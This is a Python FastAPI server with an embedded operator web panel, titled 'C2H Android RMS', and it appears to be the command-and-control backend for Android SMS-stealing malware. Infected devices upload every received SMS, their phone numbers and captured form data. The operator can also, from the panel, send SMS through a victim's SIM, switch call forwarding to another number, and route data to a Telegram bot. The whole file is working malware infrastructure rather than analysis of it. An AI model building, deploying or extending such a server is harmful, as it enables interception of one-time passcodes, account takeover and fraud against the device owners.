import uvicorn
from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel
from typing import List, Optional, Dict, Any
from datetime import datetime, timedelta, timezone
import sqlite3
import json
import os

# --- Configuration ---
DATABASE_URL = "rms.db"
ONLINE_THRESHOLD_SECONDS = 20

# --- Database Initialization ---
def get_db_connection():
    conn = sqlite3.connect(DATABASE_URL, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def now_utc_string():
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")

def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Devices table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT UNIQUE NOT NULL,
            device_name TEXT,
            os_version TEXT,
            phone_number TEXT,
            battery_level INTEGER,
            last_seen DATETIME NOT NULL,
            created_at DATETIME NOT NULL
        );
    """)
    
    # Commands table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            command_type TEXT NOT NULL,
            command_data TEXT NOT NULL,
            status TEXT NOT NULL DEFAULT 'pending',
            created_at DATETIME NOT NULL
        );
    """)

    # SMS logs table - यही important है
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS sms_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            sender TEXT NOT NULL,
            message_body TEXT NOT NULL,
            received_at DATETIME NOT NULL
        );
    """)
    
    # Add index for faster queries
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_sms_device ON sms_logs (device_id);")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_sms_date ON sms_logs (received_at DESC);")

    # Form submissions table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS form_submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            custom_data TEXT NOT NULL,
            submitted_at DATETIME NOT NULL
        );
    """)

    # Global settings table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS global_settings (
            setting_key TEXT PRIMARY KEY UNIQUE NOT NULL,
            setting_value TEXT
        );
    """)
    
    # Default settings
    cursor.execute("INSERT OR IGNORE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
                  ('sms_forward_number', '9923255555'))
    cursor.execute("INSERT OR IGNORE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
                  ('telegram_bot_token', ''))
    cursor.execute("INSERT OR IGNORE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
                  ('telegram_chat_id', ''))
    
    conn.commit()
    conn.close()

# Initialize database
init_db()

# --- Pydantic Models ---
class DeviceRegisterRequest(BaseModel):
    device_id: str
    device_name: Optional[str] = None
    os_version: Optional[str] = None
    phone_number: Optional[str] = None
    battery_level: Optional[int] = None

class DeviceResponse(BaseModel):
    device_id: str
    device_name: Optional[str] = None
    os_version: Optional[str] = None
    phone_number: Optional[str] = None
    battery_level: Optional[int] = None
    is_online: bool
    created_at: str
    last_seen: str

class SmsForwardConfigRequest(BaseModel):
    forward_number: str

class TelegramConfigRequest(BaseModel):
    telegram_bot_token: str
    telegram_chat_id: str

class SendCommandRequest(BaseModel):
    device_id: str
    command_type: str
    command_data: Dict[str, Any]

class FormSubmissionRequest(BaseModel):
    custom_data: str

class SmsLogRequest(BaseModel):
    sender: str
    message_body: str

# --- FastAPI Application ---
app = FastAPI(title="C2H Android RMS")

# --- HTML Panel (सीधा यहीं) ---
HTML_PANEL = """
<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📱 Device Control Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', sans-serif;
        }
        body {
            background: #f0f2f5;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        h1 {
            color: #1a237e;
            margin-bottom: 20px;
            font-size: 2em;
        }
        
        /* टॉप बटन */
        .top-buttons {
            display: flex;
            gap: 15px;
            margin-bottom: 30px;
            flex-wrap: wrap;
        }
        .top-btn {
            padding: 15px 30px;
            border: none;
            border-radius: 12px;
            font-size: 1.1em;
            font-weight: bold;
            cursor: pointer;
            background: white;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .top-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 12px rgba(0,0,0,0.15);
        }
        .sms-forward-btn { color: #4caf50; border-left: 4px solid #4caf50; }
        .telegram-btn { color: #0088cc; border-left: 4px solid #0088cc; }
        
        /* मोडल */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal.active {
            display: flex;
        }
        .modal-content {
            background: white;
            width: 90%;
            max-width: 400px;
            padding: 30px;
            border-radius: 20px;
            position: relative;
        }
        .modal-content h3 {
            margin-bottom: 20px;
            color: #333;
        }
        .modal-content input, .modal-content select, .modal-content textarea {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 1em;
        }
        .modal-content textarea {
            height: 100px;
            resize: vertical;
        }
        .modal-content button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 1em;
            cursor: pointer;
            margin: 5px 0;
        }
        .modal-content .close {
            position: absolute;
            top: 15px;
            right: 20px;
            font-size: 24px;
            cursor: pointer;
            color: #666;
        }
        .sim-selector {
            display: flex;
            gap: 15px;
            margin: 10px 0;
        }
        .sim-selector label {
            display: flex;
            align-items: center;
            gap: 5px;
            cursor: pointer;
        }
        
        /* डिवाइस ग्रिड */
        .device-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        .device-card {
            background: white;
            border-radius: 15px;
            padding: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            cursor: pointer;
            transition: all 0.3s;
            border-left: 5px solid #4caf50;
        }
        .device-card.offline {
            border-left-color: #f44336;
            opacity: 0.8;
        }
        .device-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 15px rgba(0,0,0,0.2);
        }
        .device-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        .device-name {
            font-size: 1.2em;
            font-weight: bold;
            color: #333;
        }
        .status {
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 0.85em;
            font-weight: bold;
        }
        .online .status { background: #4caf50; color: white; }
        .offline .status { background: #f44336; color: white; }
        .battery {
            display: flex;
            align-items: center;
            gap: 10px;
            margin: 10px 0;
        }
        .battery-bar {
            flex: 1;
            height: 8px;
            background: #e0e0e0;
            border-radius: 4px;
            overflow: hidden;
        }
        .battery-level {
            height: 100%;
            background: #4caf50;
            border-radius: 4px;
        }
        
        /* डिवाइस डिटेल पेज */
        .device-detail-page {
            display: none;
        }
        .device-detail-page.active {
            display: block;
        }
        .detail-header {
            background: white;
            padding: 20px;
            border-radius: 15px;
            margin-bottom: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .back-btn {
            padding: 10px 20px;
            background: #666;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }
        .action-buttons {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .action-btn {
            padding: 15px 25px;
            border: none;
            border-radius: 10px;
            font-size: 1em;
            font-weight: bold;
            cursor: pointer;
            color: white;
            transition: all 0.3s;
            flex: 1;
            min-width: 120px;
        }
        .action-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        .sms-action { background: #4caf50; }
        .call-action { background: #ff9800; }
        .form-action { background: #9c27b0; }
        
        /* SMS लिस्ट */
        .sms-list {
            background: white;
            border-radius: 15px;
            padding: 20px;
            max-height: 600px;
            overflow-y: auto;
        }
        .sms-item {
            padding: 15px;
            border-bottom: 1px solid #e0e0e0;
            margin-bottom: 10px;
            background: #f9f9f9;
            border-radius: 8px;
        }
        .sms-item:last-child {
            border-bottom: none;
        }
        .sms-sender {
            font-weight: bold;
            color: #1a237e;
            margin-bottom: 5px;
            font-size: 1.1em;
        }
        .sms-message {
            color: #333;
            margin-bottom: 5px;
            white-space: pre-wrap;
            font-size: 1em;
            line-height: 1.5;
        }
        .sms-time {
            font-size: 0.8em;
            color: #999;
            text-align: right;
        }
        .form-data-list {
            background: white;
            border-radius: 15px;
            padding: 20px;
        }
        .form-item {
            background: #f5f5f5;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 10px;
        }
        .no-data {
            text-align: center;
            padding: 50px;
            color: #999;
        }
        .loading {
            text-align: center;
            padding: 30px;
            color: #666;
        }
        .sms-count {
            background: #1a237e;
            color: white;
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 0.9em;
            margin-left: 10px;
        }
    </style>
</head>
<body>
    <div id="mainPage" class="container">
        <h1>📱 Device Control Panel</h1>
        
        <!-- टॉप बटन -->
        <div class="top-buttons">
            <button class="top-btn sms-forward-btn" onclick="openSMSModal()">
                <span>📨</span> Change Forward Number
            </button>
            <button class="top-btn telegram-btn" onclick="openTelegramModal()">
                <span>🤖</span> Configure Telegram
            </button>
        </div>
        
        <!-- डिवाइस लिस्ट -->
        <h2>📱 Registered Devices <span id="deviceCount">(0)</span></h2>
        <div id="deviceGrid" class="device-grid">
            <div class="loading">Loading devices...</div>
        </div>
    </div>

    <!-- डिवाइस डिटेल पेज -->
    <div id="deviceDetailPage" class="device-detail-page">
        <div class="container">
            <div class="detail-header">
                <h2 id="detailDeviceName">Device Name</h2>
                <button class="back-btn" onclick="showMainPage()">← Back</button>
            </div>
            
            <!-- एक्शन बटन -->
            <div class="action-buttons">
                <button class="action-btn sms-action" onclick="openSendSMSModal()">📨 Send SMS</button>
                <button class="action-btn call-action" onclick="openCallForwardModal()">📞 Call Forwarding</button>
                <button class="action-btn form-action" onclick="showFormData()">📋 Get Form Data</button>
            </div>
            
            <!-- SMS लिस्ट -->
            <h3>📨 SMS Inbox <span id="smsCount" class="sms-count">0</span></h3>
            <div id="smsList" class="sms-list">
                <div class="loading">Loading SMS...</div>
            </div>
        </div>
    </div>

    <!-- SMS Forward Modal -->
    <div id="smsModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal('smsModal')">&times;</span>
            <h3>📨 Change Forward Number</h3>
            <input type="text" id="forwardNumber" placeholder="Enter phone number">
            <button onclick="updateSMSNumber()">Update Number</button>
        </div>
    </div>

    <!-- Telegram Modal -->
    <div id="telegramModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal('telegramModal')">&times;</span>
            <h3>🤖 Configure Telegram</h3>
            <input type="text" id="botToken" placeholder="Bot Token">
            <input type="text" id="chatId" placeholder="Chat ID">
            <button onclick="updateTelegram()">Save Configuration</button>
        </div>
    </div>

    <!-- Send SMS Modal -->
    <div id="sendSMSModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal('sendSMSModal')">&times;</span>
            <h3>📨 Send SMS</h3>
            <input type="text" id="smsPhone" placeholder="Phone Number">
            <textarea id="smsMessage" placeholder="Message"></textarea>
            <div class="sim-selector">
                <label><input type="radio" name="smsSim" value="0" checked> SIM 1</label>
                <label><input type="radio" name="smsSim" value="1"> SIM 2</label>
            </div>
            <button onclick="sendSMS()">Send SMS</button>
        </div>
    </div>

    <!-- Call Forward Modal -->
    <div id="callForwardModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal('callForwardModal')">&times;</span>
            <h3>📞 Call Forwarding</h3>
            <select id="callAction">
                <option value="enable">Enable Forwarding</option>
                <option value="disable">Disable Forwarding</option>
            </select>
            <input type="text" id="forwardTo" placeholder="Forward to Number (for enable)">
            <div class="sim-selector">
                <label><input type="radio" name="callSim" value="0" checked> SIM 1</label>
                <label><input type="radio" name="callSim" value="1"> SIM 2</label>
            </div>
            <button onclick="sendCallCommand()">Execute</button>
        </div>
    </div>

    <!-- Form Data Modal -->
    <div id="formDataModal" class="modal">
        <div class="modal-content" style="max-width: 600px;">
            <span class="close" onclick="closeModal('formDataModal')">&times;</span>
            <h3>📋 Form Submissions</h3>
            <div id="formDataList" style="max-height: 400px; overflow-y: auto;">
                Loading...
            </div>
        </div>
    </div>

    <script>
        let currentDeviceId = null;
        let refreshInterval = null;
        let smsRefreshInterval = null;

        // पेज लोड
        document.addEventListener('DOMContentLoaded', function() {
            loadDevices();
            loadConfig();
            refreshInterval = setInterval(loadDevices, 5000);
        });

        // मोडल functions
        function openSMSModal() { document.getElementById('smsModal').classList.add('active'); }
        function openTelegramModal() { document.getElementById('telegramModal').classList.add('active'); }
        function openSendSMSModal() { document.getElementById('sendSMSModal').classList.add('active'); }
        function openCallForwardModal() { document.getElementById('callForwardModal').classList.add('active'); }
        function closeModal(id) { document.getElementById(id).classList.remove('active'); }

        // पेज navigation
        function showMainPage() {
            document.getElementById('mainPage').style.display = 'block';
            document.getElementById('deviceDetailPage').classList.remove('active');
            if (smsRefreshInterval) {
                clearInterval(smsRefreshInterval);
                smsRefreshInterval = null;
            }
        }

        function showDevicePage(deviceId) {
            currentDeviceId = deviceId;
            document.getElementById('mainPage').style.display = 'none';
            document.getElementById('deviceDetailPage').classList.add('active');
            loadDeviceDetails(deviceId);
            
            // हर 3 सेकंड में SMS रिफ्रेश
            if (smsRefreshInterval) clearInterval(smsRefreshInterval);
            smsRefreshInterval = setInterval(() => loadDeviceSMS(deviceId), 3000);
        }

        // कॉन्फिग लोड
        async function loadConfig() {
            try {
                const smsRes = await fetch('/api/config/sms_forward');
                const smsData = await smsRes.json();
                document.getElementById('forwardNumber').value = smsData.forward_number || '';
                
                const telRes = await fetch('/api/config/telegram');
                const telData = await telRes.json();
                document.getElementById('botToken').value = telData.telegram_bot_token || '';
                document.getElementById('chatId').value = telData.telegram_chat_id || '';
            } catch (error) {
                console.error('Config error:', error);
            }
        }

        // डिवाइस लोड
        async function loadDevices() {
            try {
                const res = await fetch('/api/devices');
                const devices = await res.json();
                
                document.getElementById('deviceCount').textContent = `(${devices.length})`;
                
                if (devices.length === 0) {
                    document.getElementById('deviceGrid').innerHTML = '<div class="no-data">No devices registered yet</div>';
                    return;
                }
                
                let html = '';
                devices.forEach(device => {
                    const statusClass = device.is_online ? 'online' : 'offline';
                    
                    html += `
                        <div class="device-card ${statusClass}" onclick="showDevicePage('${device.device_id}')">
                            <div class="device-header">
                                <span class="device-name">${escapeHtml(device.device_name || 'Unknown')}</span>
                                <span class="status">${device.is_online ? 'ONLINE' : 'OFFLINE'}</span>
                            </div>
                            <div class="battery">
                                <span>🔋</span>
                                <div class="battery-bar">
                                    <div class="battery-level" style="width: ${device.battery_level}%;"></div>
                                </div>
                                <span>${device.battery_level}%</span>
                            </div>
                            <div>📱 ${escapeHtml(device.os_version || 'Android')}</div>
                            <div>📞 ${escapeHtml(device.phone_number || 'No number')}</div>
                            <div style="font-size:0.85em;color:#999;margin-top:10px">
                                Last seen: ${escapeHtml(device.last_seen || 'Never')}
                            </div>
                        </div>
                    `;
                });
                
                document.getElementById('deviceGrid').innerHTML = html;
            } catch (error) {
                console.error('Devices error:', error);
            }
        }

        // Device SMS लोड करें (अलग function)
        async function loadDeviceSMS(deviceId) {
            try {
                const smsRes = await fetch(`/api/device/${deviceId}/sms`);
                const smsLogs = await smsRes.json();
                
                document.getElementById('smsCount').textContent = smsLogs.length;
                
                if (smsLogs.length === 0) {
                    document.getElementById('smsList').innerHTML = '<div class="no-data">No SMS messages yet</div>';
                    return;
                }
                
                let smsHtml = '';
                smsLogs.forEach(sms => {
                    smsHtml += `
                        <div class="sms-item">
                            <div class="sms-sender">From: ${escapeHtml(sms.sender)}</div>
                            <div class="sms-message">${escapeHtml(sms.message_body)}</div>
                            <div class="sms-time">${escapeHtml(sms.received_at)}</div>
                        </div>
                    `;
                });
                
                document.getElementById('smsList').innerHTML = smsHtml;
                
            } catch (error) {
                console.error('SMS load error:', error);
            }
        }

        // डिवाइस डिटेल लोड
        async function loadDeviceDetails(deviceId) {
            try {
                // Device info
                const devicesRes = await fetch('/api/devices');
                const devices = await devicesRes.json();
                const device = devices.find(d => d.device_id === deviceId);
                
                if (device) {
                    document.getElementById('detailDeviceName').textContent = 
                        `📱 ${escapeHtml(device.device_name || 'Unknown Device')}`;
                }
                
                // SMS लोड
                await loadDeviceSMS(deviceId);
                
            } catch (error) {
                console.error('Device details error:', error);
            }
        }

        // फॉर्म डेटा दिखाएँ
        async function showFormData() {
            if (!currentDeviceId) return;
            
            const modal = document.getElementById('formDataModal');
            const list = document.getElementById('formDataList');
            
            list.innerHTML = '<div class="loading">Loading...</div>';
            modal.classList.add('active');
            
            try {
                const res = await fetch(`/api/device/${currentDeviceId}/forms`);
                const forms = await res.json();
                
                if (forms.length === 0) {
                    list.innerHTML = '<div class="no-data">No form submissions yet</div>';
                } else {
                    let html = '';
                    forms.forEach(form => {
                        html += `
                            <div class="form-item">
                                <div style="font-weight:bold;margin-bottom:5px">${escapeHtml(form.submitted_at)}</div>
                                <div style="white-space:pre-wrap">${escapeHtml(form.custom_data)}</div>
                            </div>
                        `;
                    });
                    list.innerHTML = html;
                }
            } catch (error) {
                list.innerHTML = '<div class="no-data">Error loading form data</div>';
            }
        }

        // SMS नंबर अपडेट
        async function updateSMSNumber() {
            const number = document.getElementById('forwardNumber').value;
            if (!number) return alert('Please enter a number');
            
            try {
                const res = await fetch('/api/config/sms_forward', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({forward_number: number})
                });
                
                if (res.ok) {
                    alert('✅ SMS forward number updated!');
                    closeModal('smsModal');
                }
            } catch (error) {
                alert('❌ Error updating');
            }
        }

        // टेलीग्राम अपडेट
        async function updateTelegram() {
            const data = {
                telegram_bot_token: document.getElementById('botToken').value,
                telegram_chat_id: document.getElementById('chatId').value
            };
            
            try {
                const res = await fetch('/api/config/telegram', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                
                if (res.ok) {
                    alert('✅ Telegram config updated!');
                    closeModal('telegramModal');
                }
            } catch (error) {
                alert('❌ Error updating');
            }
        }

        // SMS भेजें
        async function sendSMS() {
            if (!currentDeviceId) return;
            
            const phone = document.getElementById('smsPhone').value;
            const message = document.getElementById('smsMessage').value;
            const sim = document.querySelector('input[name="smsSim"]:checked').value;
            
            if (!phone || !message) return alert('Please fill all fields');
            
            try {
                const res = await fetch('/api/command/send', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        device_id: currentDeviceId,
                        command_type: 'send_sms',
                        command_data: {
                            phone_number: phone,
                            message: message,
                            sim_slot: parseInt(sim)
                        }
                    })
                });
                
                if (res.ok) {
                    alert('✅ SMS command sent!');
                    closeModal('sendSMSModal');
                    document.getElementById('smsPhone').value = '';
                    document.getElementById('smsMessage').value = '';
                }
            } catch (error) {
                alert('❌ Error sending command');
            }
        }

        // कॉल फॉरवर्ड कमांड भेजें
        async function sendCallCommand() {
            if (!currentDeviceId) return;
            
            const action = document.getElementById('callAction').value;
            const forwardNumber = document.getElementById('forwardTo').value;
            const sim = document.querySelector('input[name="callSim"]:checked').value;
            
            if (action === 'enable' && !forwardNumber) {
                return alert('Please enter forward number');
            }
            
            try {
                const commandData = {
                    action: action,
                    sim_slot: parseInt(sim)
                };
                
                if (action === 'enable') {
                    commandData.forward_number = forwardNumber;
                }
                
                const res = await fetch('/api/command/send', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        device_id: currentDeviceId,
                        command_type: 'call_forward',
                        command_data: commandData
                    })
                });
                
                if (res.ok) {
                    alert(`✅ Call ${action === 'enable' ? 'forwarding enabled' : 'forwarding disabled'}!`);
                    closeModal('callForwardModal');
                    document.getElementById('forwardTo').value = '';
                }
            } catch (error) {
                alert('❌ Error sending command');
            }
        }

        // HTML escape
        function escapeHtml(text) {
            if (!text) return '';
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        // Cleanup
        window.onbeforeunload = function() {
            if (refreshInterval) clearInterval(refreshInterval);
            if (smsRefreshInterval) clearInterval(smsRefreshInterval);
        };
    </script>
</body>
</html>
"""

@app.get("/", response_class=HTMLResponse)
async def get_panel():
    return HTMLResponse(content=HTML_PANEL)

# --- API Endpoints ---

@app.post("/api/device/register")
async def register_device(data: DeviceRegisterRequest):
    conn = get_db_connection()
    cursor = conn.cursor()
    current_time_str = now_utc_string()
    clean_device_id = data.device_id.strip()

    cursor.execute("SELECT id FROM devices WHERE device_id = ?", (clean_device_id,))
    device = cursor.fetchone()
    
    if device:
        cursor.execute(
            "UPDATE devices SET device_name=?, os_version=?, phone_number=?, battery_level=?, last_seen=? WHERE device_id=?",
            (data.device_name, data.os_version, data.phone_number, data.battery_level, current_time_str, clean_device_id)
        )
    else:
        cursor.execute(
            "INSERT INTO devices (device_id, device_name, os_version, phone_number, battery_level, last_seen, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)",
            (clean_device_id, data.device_name, data.os_version, data.phone_number, data.battery_level, current_time_str, current_time_str)
        )
        
    conn.commit()
    conn.close()
    return {"status": "success"}

@app.get("/api/devices", response_model=List[DeviceResponse])
async def get_devices():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM devices ORDER BY last_seen DESC")
    devices = cursor.fetchall()
    response_list = []
    current_time_utc = datetime.now(timezone.utc)
    for device in devices:
        try:
            last_seen_dt = datetime.strptime(device['last_seen'], "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
        except:
            last_seen_dt = current_time_utc - timedelta(days=1)
        is_online = (current_time_utc - last_seen_dt).total_seconds() < ONLINE_THRESHOLD_SECONDS
        response_list.append(DeviceResponse(
            device_id=device['device_id'],
            device_name=device['device_name'] or "Unknown",
            os_version=device['os_version'] or "Unknown",
            phone_number=device['phone_number'] or "No Number",
            battery_level=device['battery_level'] or 0,
            is_online=is_online,
            created_at=device['created_at'],
            last_seen=device['last_seen']
        ))
    conn.close()
    return response_list

@app.post("/api/config/sms_forward")
async def update_sms_forward_config(data: SmsForwardConfigRequest):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
                  ('sms_forward_number', data.forward_number))
    conn.commit()
    conn.close()
    return {"status": "success"}

@app.post("/api/config/telegram")
async def update_telegram_config(data: TelegramConfigRequest):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
                  ('telegram_bot_token', data.telegram_bot_token))
    cursor.execute("INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
                  ('telegram_chat_id', data.telegram_chat_id))
    conn.commit()
    conn.close()
    return {"status": "success"}

@app.get("/api/config/sms_forward")
async def get_sms_forward_config():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT setting_value FROM global_settings WHERE setting_key = ?", ('sms_forward_number',))
    result = cursor.fetchone()
    conn.close()
    return {"forward_number": result['setting_value'] if result else ""}

@app.get("/api/config/telegram")
async def get_telegram_config():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT setting_key, setting_value FROM global_settings WHERE setting_key IN ('telegram_bot_token', 'telegram_chat_id')")
    results = {row['setting_key']: row['setting_value'] for row in cursor.fetchall()}
    conn.close()
    return {
        "telegram_bot_token": results.get('telegram_bot_token', ''),
        "telegram_chat_id": results.get('telegram_chat_id', '')
    }

@app.post("/api/command/send")
async def send_command(data: SendCommandRequest):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO commands (device_id, command_type, command_data, created_at) VALUES (?, ?, ?, ?)",
        (data.device_id.strip(), data.command_type, json.dumps(data.command_data), now_utc_string())
    )
    conn.commit()
    conn.close()
    return {"status": "success", "message": "Command sent."}

@app.get("/api/device/{device_id}/commands")
async def get_pending_commands(device_id: str):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "SELECT id, command_type, command_data FROM commands WHERE device_id = ? AND status = 'pending'",
        (device_id.strip(),)
    )
    commands = cursor.fetchall()
    command_list = [{"id": cmd['id'], "command_type": cmd['command_type'], "command_data": json.loads(cmd['command_data'])} for cmd in commands]
    if command_list:
        command_ids = [cmd['id'] for cmd in command_list]
        placeholders = ','.join('?' * len(command_ids))
        cursor.execute(f"UPDATE commands SET status = 'sent' WHERE id IN ({placeholders})", command_ids)
        conn.commit()
    conn.close()
    return command_list

@app.post("/api/command/{command_id}/execute")
async def mark_command_executed(command_id: int):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("UPDATE commands SET status = 'executed' WHERE id = ?", (command_id,))
    conn.commit()
    conn.close()
    return {"status": "success"}

@app.post("/api/device/{device_id}/forms")
async def submit_form(device_id: str, data: FormSubmissionRequest):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO form_submissions (device_id, custom_data, submitted_at) VALUES (?, ?, ?)",
        (device_id.strip(), data.custom_data, now_utc_string())
    )
    conn.commit()
    conn.close()
    return {"status": "success"}

@app.get("/api/device/{device_id}/forms")
async def get_form_submissions(device_id: str):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT id, custom_data, submitted_at FROM form_submissions WHERE device_id = ? ORDER BY submitted_at DESC", (device_id.strip(),))
    forms = cursor.fetchall()
    conn.close()
    return [{"id": form['id'], "custom_data": form['custom_data'], "submitted_at": form['submitted_at']} for form in forms]

# ★★★ यह सबसे important endpoint है - यही SMS receive करता है ★★★
@app.post("/api/device/{device_id}/sms")
async def log_sms(device_id: str, data: SmsLogRequest):
    print(f"📨 SMS received from device {device_id}: {data.sender} - {data.message_body}")
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO sms_logs (device_id, sender, message_body, received_at) VALUES (?, ?, ?, ?)",
        (device_id.strip(), data.sender, data.message_body, now_utc_string())
    )
    conn.commit()
    conn.close()
    return {"status": "success"}

# ★★★ यह endpoint SMS लिस्ट लौटाता है ★★★
@app.get("/api/device/{device_id}/sms")
async def get_sms_logs(device_id: str):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "SELECT id, sender, message_body, received_at FROM sms_logs WHERE device_id = ? ORDER BY received_at DESC LIMIT 500", 
        (device_id.strip(),)
    )
    sms_logs = cursor.fetchall()
    conn.close()
    
    result = []
    for sms in sms_logs:
        result.append({
            "id": sms['id'],
            "sender": sms['sender'],
            "message_body": sms['message_body'],
            "received_at": sms['received_at']
        })
    
    print(f"📤 Returning {len(result)} SMS for device {device_id}")
    return result

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run("main:app", host="0.0.0.0", port=port)
